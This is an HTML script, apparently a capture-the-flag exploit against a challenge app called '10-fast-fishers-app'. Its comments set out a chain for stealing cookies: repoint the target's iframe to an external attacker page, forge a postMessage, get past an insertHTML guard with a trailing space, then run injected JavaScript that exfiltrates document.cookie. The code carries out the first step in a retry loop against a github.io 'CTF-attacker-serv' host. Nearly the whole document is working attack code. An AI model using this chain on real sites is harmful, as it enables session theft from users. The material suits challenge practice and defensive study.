<script>
console.log("PWN-START");

// Exploit chain:
// 1) Open the target app in T2.
// 2) Repoint T2 iframe[0] to our attacker frame (WindowProxy remains same).
// 3) Attacker frame postMessage() to parent with forged FISH_CLICKED.
// 4) Bypass inserthtml guard via trailing space: "insertHTML ".
// 5) Execute onerror JS in parent origin and exfiltrate document.cookie.

const target = "http://10-fast-fishers-app:5000/";
const framePayload = "https://egraomire2.github.io/CTF-attacker-serv/frame_payload.html";

const w = window.open(target, "_blank");
console.log("POPUP-OPENED-" + target);

let tries = 0;
const navLoop = setInterval(() => {
  tries++;
  try {
    if (!w || w.closed) {
      clearInterval(navLoop);
      console.log("POPUP-CLOSED");
      return;
    }

    // This is the key primitive: cross-origin write to iframe location.
    w.frames[0].location = framePayload;
    console.log("IFRAME-NAV-OK-" + tries);

    // Keep trying a bit to win races with app's own activity.
    if (tries >= 8) {
      clearInterval(navLoop);
      console.log("PWN-DONE");
    }
  } catch (e) {
    console.log("IFRAME-NAV-ERR-" + tries + ":" + e.message);
    if (tries >= 20) {
      clearInterval(navLoop);
      console.log("PWN-ABORT");
    }
  }
}, 180);

</script>
